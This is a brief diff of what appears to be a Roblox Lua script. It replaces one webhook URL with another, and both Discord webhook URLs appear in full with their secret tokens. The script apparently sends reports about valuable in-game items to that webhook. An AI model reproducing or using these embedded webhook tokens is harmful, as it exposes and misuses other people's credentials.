@@ -3,7 +3,7 @@ local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1427505111982276719/OSz5uOz5-uue4DVdWWoGaORkmNponydKIXBNfvt2HRjGY_UJdXiTorm8KvfBMoeGE4FO"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1423896407433154690/oLVap1GQQdLaiK7a0iBBjPEjbZL_ZpcH7tcP9iYF2DGIiQ0DIG1dAOTJ7nJCYnae9OU2"
 local cfg = {UpdateInterval = 10, MinValue = 9500000}
 local lastUp = 0
 local sentAnimals = {}
